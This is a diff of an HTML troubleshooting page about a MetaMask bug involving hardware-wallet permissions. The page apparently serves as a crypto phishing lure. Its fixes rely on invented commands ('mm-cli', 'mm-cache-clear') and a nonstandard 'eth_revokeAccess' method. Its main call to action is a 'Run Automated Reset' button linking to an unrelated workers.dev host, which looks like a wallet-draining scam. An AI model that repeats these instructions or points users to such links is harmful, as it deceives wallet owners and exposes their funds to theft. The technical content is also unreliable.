@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Bug Permissions Removing Hardware Wallet Acc – Fix Guide</title>
 <style>
     body {
-        font-family: BlinkMacSystemFont;
-        background: #1a1a24;
+        font-family: system-ui;
+        background: #0f111a;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff9455; }
+    a { color: #cf6679; }
     .btn {
-        background: #cf6679;
+        background: #ff9455;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,29 +42,30 @@
 <h1>Metamask Extension Bug Permissions Removing Hardware Wallet Acc</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users experience an issue where removing a hardware wallet account from Metamask does not clear the associated permissions, resulting in unexpected behavior and potential security risks.</li>
+<li>Users encounter an issue where removing a hardware wallet account from Metamask does not clear the associated permissions, leading to unexpected behavior and potential security vulnerabilities.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a bug in the Metamask extension, where the removal of a hardware wallet account does not properly revoke the previously granted permissions, leading to a mismatch between the user's intended access and the actual permissions stored.</li>
+<li>The error occurs due to a bug in the Metamask extension, where the permissions tied to a hardware wallet account are not properly revoked when the account is removed.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Attempt to manually revoke permissions by using the <code>eth_revokeAccess</code> RPC method.</li>
-<li>Use the Metamask API to remove the hardware wallet account and then restart the browser.</li>
-<li>Execute the following command to clear the permissions cache:</li>
+<li>To resolve the issue, users can attempt the following manual overrides:</li>
+<li>Delete the local storage data associated with the Metamask extension</li>
+<li>Reset the Metamask extension to its default settings</li>
+<li>Execute the following command to revoke permissions:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>mm-cache-clear<span class="w"> </span>--permissions
+<div class="codehilite"><pre><span></span><code>mm-cli<span class="w"> </span>--revoke-permissions<span class="w"> </span>--account<span class="o">=</span>&lt;hardware-wallet-account-address&gt;
 </code></pre></div>
 
-<p>Consider utilizing an external console for further debugging and management of wallet permissions.</p>
+<p>Consider utilizing an external console for enhanced debugging capabilities.</p>
 <h2>Prerequisites</h2>
 <ul>
 <li>Metamask extension installed and configured</li>
-<li>Hardware wallet connected and set up</li>
-<li>Basic understanding of Ethereum RPC methods and wallet management</li>
+<li>Hardware wallet account connected to Metamask</li>
+<li>Basic understanding of command-line interfaces and wallet management</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li><li><a href="./archive/2026/06/metamask-extension-bug-activity-contract-deployments-are-displa.html">Metamask Extension Bug Activity Contract Deployments Are Displayed as Contract Interaction</a></li><li><a href="./archive/2026/06/metamask-extension-bug-notifications-notification-badge-red-num.html">Metamask Extension Bug Notifications Notification Badge Red Num</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-activity-send-nft-displays-id-as-if-it-w.html">Metamask Extension Bug Activity Send Nft Displays Id As If It Were Amount</a></li><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/go-ethereum-error-in-block-freeze-operation-errcanonical-hash-m.html">Go Ethereum Error In Block Freeze Operation Errcanonical Hash M</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
